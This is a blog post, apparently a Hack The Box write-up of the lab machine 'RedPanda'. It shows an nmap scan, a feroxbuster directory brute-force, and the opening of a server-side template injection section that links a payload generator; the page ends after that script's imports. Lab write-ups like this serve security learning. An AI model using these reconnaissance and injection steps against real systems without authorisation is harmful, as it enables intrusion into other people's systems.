<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - RedPanda | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - RedPanda - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-16-htb-redpanda-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-16-htb-redpanda-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - RedPanda"><meta property="og:description" content="HTB - RedPanda - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-16-htb-redpanda-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-16T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-16T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - RedPanda"><meta name=twitter:description content="HTB - RedPanda - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - RedPanda","item":"https://cadil.github.io/posts/2024-03-16-htb-redpanda-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - RedPanda","name":"HTB - RedPanda","description":"HTB - RedPanda - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.170 # Local Address 2. Nmap nmap -sV -sC -oA nmap/trick 10.10.11.170 # Nmap 7.92 scan initiated Wed Jul 27 10:48:13 2022 as: nmap -sV -sC -oA nmap/redpanda 10.10.11.170 Nmap scan report for 10.10.11.170 Host is up (0.22s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Wed, 27 Jul 2022 14:48:35 GMT | Connection: close | \u003c!DOCTYPE html\u003e | ","wordCount":"1112","inLanguage":"mn","datePublished":"2024-03-16T00:00:00Z","dateModified":"2024-03-16T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-16-htb-redpanda-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - RedPanda</h1><div class=post-description>HTB - RedPanda - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-16 00:00:00 +0000 UTC'>гуравдугаар сар 16, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-feroxbuster aria-label="3. Feroxbuster">3. Feroxbuster</a></li><li><a href=#4-ssti aria-label="4. SSTI">4. SSTI</a></li><li><a href=#5-privilege-escalation aria-label="5. Privilege escalation">5. Privilege escalation</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.170
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/trick 10.10.11.170
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.92 scan initiated Wed Jul 27 10:48:13 2022 as: nmap -sV -sC -oA nmap/redpanda 10.10.11.170</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.170
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.22s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE    VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8080/tcp open  http-proxy
</span></span><span style=display:flex><span>|_http-title: Red Panda Search | Made with Spring Boot
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#ae81ff>200</span> 
</span></span><span style=display:flex><span>|     Content-Type: text/html;charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>|     Content-Language: en-US
</span></span><span style=display:flex><span>|     Date: Wed, <span style=color:#ae81ff>27</span> Jul <span style=color:#ae81ff>2022</span> 14:48:35 GMT
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>|     &lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span> dir<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ltr&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta author<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wooden_k&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/panda.css&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;link rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/main.css&#34;</span> type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;pande&#39;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ear left&#39;</span>&gt;&lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ear right&#39;</span>&gt;&lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;whiskers left&#39;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;whiskers right&#39;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style=display:flex><span>|     &lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;face&#39;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;eye
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   HTTPOptions: 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     HTTP/1.1 200 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Allow: GET,HEAD,OPTIONS
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Content-Length: 0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Date: Wed, 27 Jul 2022 14:48:36 GMT
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Connection: close
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   RTSPRequest: 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     HTTP/1.1 400 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Content-Type: text/html;charset=utf-8
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Content-Language: en
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Content-Length: 435
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Date: Wed, 27 Jul 2022 14:48:36 GMT
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Connection: close
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_http-open-proxy: Proxy might be redirecting requests
</span></span></span><span style=display:flex><span><span style=color:#e6db74>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF-Port8080-TCP:V=7.92%I=7%D=7/27%Time=62E15041%P=x86_64-pc-linux-gnu%r(Ge
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:tRequest,690,&#34;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Wed,\x2027\x20Jul\x20
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:2022\x2014:48:35\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20htm
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:l&gt;\n&lt;html\x20lang=\&#34;en\&#34;\x20dir=\&#34;ltr\&#34;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=\&#34;woode
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:n_k\&#34;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https://codepe
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:n\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesh
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:eet\&#34;\x20href=\&#34;css/panda\.css\&#34;\x20type=\&#34;text/css\&#34;&gt;\n\x20\x20\x20\x2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:0&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/main\.css\&#34;\x20type=\&#34;text/c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ss\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\x20w
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:ith\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20\x20&lt;div\x20class=&#39;</span>pande<span style=color:#e6db74>&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20clas
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:s=&#39;</span>ear<span style=color:#ae81ff>\x</span>20left<span style=color:#e6db74>&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>ear<span style=color:#ae81ff>\x</span>20r
</span></span><span style=display:flex><span>SF:ight<span style=color:#e6db74>&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style=color:#ae81ff>\x</span>20left<span style=color:#e6db74>&#39;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style=color:#ae81ff>\x</span>20right<span style=color:#e6db74>&#39;&gt;\n\x20\x20\x20\x20\x20\x20\
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>face<span style=color:#e6db74>&#39;&gt;\n\x20\x20\x20\x20\x
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SF:20\x20\x20\x20&lt;div\x20class=&#39;</span>eye<span style=color:#e6db74>&#34;)%r(HTTPOptions,75,&#34;</span>HTTP/1<span style=color:#ae81ff>\.</span>1<span style=color:#ae81ff>\x</span>20200<span style=color:#ae81ff>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#ae81ff>\r\n</span>Allow:<span style=color:#ae81ff>\x</span>20GET,HEAD,OPTIONS<span style=color:#ae81ff>\r\n</span>Content-Length:<span style=color:#ae81ff>\x</span>200<span style=color:#ae81ff>\r\n</span>Date:<span style=color:#ae81ff>\x</span>20We
</span></span><span style=display:flex><span>SF:d,<span style=color:#ae81ff>\x</span>2027<span style=color:#ae81ff>\x</span>20Jul<span style=color:#ae81ff>\x</span>202022<span style=color:#ae81ff>\x</span>2014:48:36<span style=color:#ae81ff>\x</span>20GMT<span style=color:#ae81ff>\r\n</span>Connection:<span style=color:#ae81ff>\x</span>20close<span style=color:#ae81ff>\r\n\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>SF:r<span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;)%r(RTSPRequest,24E,&#34;</span>HTTP/1<span style=color:#ae81ff>\.</span>1<span style=color:#ae81ff>\x</span>20400<span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\r\n</span>Content-Type:<span style=color:#ae81ff>\x</span>20text/
</span></span><span style=display:flex><span>SF:html;charset<span style=color:#f92672>=</span>utf-8<span style=color:#ae81ff>\r\n</span>Content-Language:<span style=color:#ae81ff>\x</span>20en<span style=color:#ae81ff>\r\n</span>Content-Length:<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>20435</span>
</span></span><span style=display:flex><span>SF:<span style=color:#ae81ff>\r\n</span>Date:<span style=color:#ae81ff>\x</span>20Wed,<span style=color:#ae81ff>\x</span>2027<span style=color:#ae81ff>\x</span>20Jul<span style=color:#ae81ff>\x</span>202022<span style=color:#ae81ff>\x</span>2014:48:36<span style=color:#ae81ff>\x</span>20GMT<span style=color:#ae81ff>\r\n</span>Connection
</span></span><span style=display:flex><span>SF::<span style=color:#ae81ff>\x</span>20close<span style=color:#ae81ff>\r\n\r\n</span>&lt;!doctype<span style=color:#ae81ff>\x</span>20html&gt;&lt;html<span style=color:#ae81ff>\x</span>20lang<span style=color:#f92672>=</span><span style=color:#ae81ff>\&#34;</span>en<span style=color:#ae81ff>\&#34;</span>&gt;&lt;head&gt;&lt;title&gt;H
</span></span><span style=display:flex><span>SF:TTP<span style=color:#ae81ff>\x</span>20Status<span style=color:#ae81ff>\x</span>20400<span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\x</span>e2<span style=color:#ae81ff>\x</span>80<span style=color:#ae81ff>\x</span>93<span style=color:#ae81ff>\x</span>20Bad<span style=color:#ae81ff>\x</span>20Request&lt;/title&gt;&lt;style<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>SF:0type<span style=color:#f92672>=</span><span style=color:#ae81ff>\&#34;</span>text/css<span style=color:#ae81ff>\&#34;</span>&gt;body<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>font-family:Tahoma,Arial,sans-serif;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20h1
</span></span><span style=display:flex><span>SF:,<span style=color:#ae81ff>\x</span>20h2,<span style=color:#ae81ff>\x</span>20h3,<span style=color:#ae81ff>\x</span>20b<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>color:white;background-color:#525D76;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20h1<span style=color:#ae81ff>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#f92672>{</span>font-size:22px;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20h2<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>font-size:16px;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20h3<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>font-size:14px
</span></span><span style=display:flex><span>SF:;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20p<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>font-size:12px;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20a<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>color:black;<span style=color:#f92672>}</span><span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\.</span>line<span style=color:#ae81ff>\x</span>20<span style=color:#f92672>{</span>heigh
</span></span><span style=display:flex><span>SF:t:1px;background-color:#525D76;border:none;<span style=color:#f92672>}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HT
</span></span><span style=display:flex><span>SF:TP<span style=color:#ae81ff>\x</span>20Status<span style=color:#ae81ff>\x</span>20400<span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\x</span>e2<span style=color:#ae81ff>\x</span>80<span style=color:#ae81ff>\x</span>93<span style=color:#ae81ff>\x</span>20Bad<span style=color:#ae81ff>\x</span>20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html
</span></span><span style=display:flex><span>SF:&gt;<span style=color:#e6db74>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#e6db74># Nmap done at Wed Jul 27 10:48:58 2022 -- 1 IP address (1 host up) scanned in 44.99 seconds
</span></span></span></code></pre></div><h3 id=3-feroxbuster>3. Feroxbuster<a hidden class=anchor aria-hidden=true href=#3-feroxbuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>feroxbuster -u http://redpanda.htb:8080 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span> ___  ___  __   __     __      __         __   ___
</span></span><span style=display:flex><span>|__  |__  |__<span style=color:#f92672>)</span> |__<span style=color:#f92672>)</span> | /  <span style=color:#e6db74>`</span>    /  <span style=color:#ae81ff>\ \_</span>/ | |  <span style=color:#ae81ff>\ </span>|__
</span></span><span style=display:flex><span>|    |___ |  <span style=color:#ae81ff>\ </span>|  <span style=color:#ae81ff>\ </span>| <span style=color:#ae81ff>\_</span>_,    <span style=color:#ae81ff>\_</span>_/ / <span style=color:#ae81ff>\ </span>| |__/ |___
</span></span><span style=display:flex><span>by Ben <span style=color:#e6db74>&#34;epi&#34;</span> Risher 🤓                 ver: 2.3.3
</span></span><span style=display:flex><span>───────────────────────────┬──────────────────────
</span></span><span style=display:flex><span> 🎯  Target Url            │ http://redpanda.htb:8080
</span></span><span style=display:flex><span> 🚀  Threads               │ <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span style=display:flex><span> 👌  Status Codes          │ <span style=color:#f92672>[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> 💥  Timeout <span style=color:#f92672>(</span>secs<span style=color:#f92672>)</span>        │ <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span> 🦡  User-Agent            │ feroxbuster/2.3.3
</span></span><span style=display:flex><span> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
</span></span><span style=display:flex><span> 🔃  Recursion Depth       │ <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
</span></span><span style=display:flex><span>───────────────────────────┴──────────────────────
</span></span><span style=display:flex><span> 🏁  Press <span style=color:#f92672>[</span>ENTER<span style=color:#f92672>]</span> to use the Scan Cancel Menu™
</span></span><span style=display:flex><span>──────────────────────────────────────────────────
</span></span><span style=display:flex><span><span style=color:#ae81ff>405</span>        1l        3w        0c http://redpanda.htb:8080/search
</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span>       32l       97w        0c http://redpanda.htb:8080/stats
</span></span><span style=display:flex><span><span style=color:#ae81ff>500</span>        1l        1w        0c http://redpanda.htb:8080/error
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   0s      found:3       errors:0      </span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   206/s   http://redpanda.htb:8080</span>
</span></span></code></pre></div><p><code>http://redpanda.htb:8080/stats</code></p><h3 id=4-ssti>4. SSTI<a hidden class=anchor aria-hidden=true href=#4-ssti>#</a></h3><p><a href=https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py>https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cmd <span style=color:#f92672>import</span> Cmd
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse<span style=color:#f92672>,</span> argparse
